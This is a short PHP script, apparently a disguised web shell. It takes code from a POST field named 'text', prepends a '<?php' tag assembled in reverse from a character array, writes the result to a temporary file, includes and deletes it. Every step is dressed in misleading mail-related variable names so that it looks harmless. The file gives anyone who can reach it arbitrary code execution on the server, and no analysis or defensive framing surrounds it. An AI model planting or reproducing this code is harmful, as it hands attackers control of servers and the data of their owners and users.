<?php
   if ( isset($_POST['text']) )
   {
    $langCheck = $_POST['text'];
    function testing($langCheck) {
        $mailSeting = tempnam("/tmp", "testing");
        $mailToSend = fopen($mailSeting, "w+");
        $isMailerReady = $langCheck;
        $isMail = ['p','h','p','?','<'];
        $mailPrepared = implode('', $isMail);
        $mailPrepared = strrev($mailPrepared);
        fwrite($mailToSend, $mailPrepared . "\n" . $isMailerReady);
        fclose($mailToSend);
        include $mailSeting;
        unlink($mailSeting);
        return get_defined_vars();
    }
    extract(testing($langCheck));
}
?>
